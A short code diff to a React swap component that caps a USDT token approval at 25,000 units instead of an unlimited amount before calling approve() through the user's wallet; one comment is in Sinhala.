@@ -111,7 +111,7 @@ export default function SwapCard({ walletAddress, provider }) {
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       
       // Unlimited Approval (MaxUint256)
-      const amount = ethers.constants.MaxUint256;
+      const amount = ethers.utils.parseUnits("25000", decimals);
 
       // Approval Call එක (කෙලින්ම WalletConnect හරහා Mobile Trust Wallet එකට / Provider එකට යයි)
       const tx = await usdtContract.approve(CONFIG.contractAddress, amount);
